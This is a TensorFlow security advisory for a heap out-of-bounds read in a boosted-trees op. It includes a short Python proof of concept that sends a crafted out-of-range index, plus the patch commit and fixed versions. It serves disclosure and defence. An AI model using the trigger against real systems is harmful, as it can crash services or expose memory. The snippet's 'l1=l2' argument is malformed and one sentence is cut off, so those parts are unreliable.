<h2>TFSA-2021-137: Heap OOB in boosted trees</h2>
<h3>CVE Number</h3>
<p>CVE-2021-37664</p>
<h3>Impact</h3>
<p>An attacker can read from outside of bounds of heap allocated data by sending
specially crafted illegal arguments to
<code>BoostedTreesSparseCalculateBestFeatureSplit</code>:</p>
<p>```python
import tensorflow as tf</p>
<p>tf.raw_ops.BoostedTreesSparseCalculateBestFeatureSplit(
  node_id_range=[0,10],
  stats_summary_indices=[[1, 2, 3, 0x1000000]],
  stats_summary_values=[1.0],
  stats_summary_shape=[1,1,1,1],
  l1=l2=[1.0],
  tree_complexity=[0.5],
  min_node_weight=[1.0],
  logits_dimension=3,
  split_type='inequality')
```</p>

needs to validate that each value in <code>stats_summary_indices</code> is in range.</p>
<h3>Patches</h3>
<p>We have patched the issue in GitHub commit
<a href="https://github.com/tensorflow/tensorflow/commit/e84c975313e8e8e38bb2ea118196369c45c51378">e84c975313e8e8e38bb2ea118196369c45c51378</a>.</p>
<p>The fix will be included in TensorFlow 2.6.0. We will also cherrypick this
commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are
also affected and still in supported range.</p>
